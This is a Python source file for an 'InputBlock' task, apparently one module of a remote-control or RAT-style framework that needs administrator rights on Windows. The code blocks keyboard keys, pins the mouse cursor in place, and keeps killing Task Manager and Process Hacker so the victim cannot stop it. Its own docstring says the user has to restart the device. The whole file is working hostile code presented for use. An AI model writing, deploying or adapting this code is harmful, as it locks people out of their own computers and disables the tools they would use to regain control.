from tasks.__task import Task


class InputBlock(Task):
    """Blocks user input. User have to restart device."""
    platforms = ["win32"]
    description = __doc__
    administrator = {"win32": True}
    kwargs = {"keyboard_block": {"type": bool, "description": "Block keyboard", "default": True},
              "mouse_block": {"type": bool, "description": "Block mouse", "default": True}}

    def __init__(self, task_id):
        super(InputBlock, self).__init__(task_id)
        import threading

        self._run = threading.Event()
        self._mouse_block_thread = None

    def run(self, **kwargs):
        assert "keyboard_block" in kwargs, "Missing keyword argument keyboard_block!"
        assert "mouse_block" in kwargs, "Missing keyword argument mouse_block!"

        keyboard_block = bool(kwargs.get("keyboard_block"))
        mouse_block = bool(kwargs.get("mouse_block"))

        from time import sleep
        from keyboard import block_key
        from psutil import process_iter
        from threading import Thread

        assert keyboard_block or mouse_block, "At least one device must be selected"

        self._run.set()
        if keyboard_block:
            for i in range(150):
                block_key(i)

        if mouse_block:
            self._mouse_block_thread = Thread(target=self._block_mouse)
            self._mouse_block_thread.start()

        while self._run.is_set():
            for proc in process_iter():
                try:
                    if proc.name() in ("Taskmgr.exe", "ProcessHacker.exe"):
                        proc.kill()
                except Exception:  # noqa
                    pass
            sleep(1)

    def _block_mouse(self):
        from mouse import move
        while self._run.is_set():
            move(1, 0, absolute=True, duration=0)

    def stop(self):
        self._run.clear()
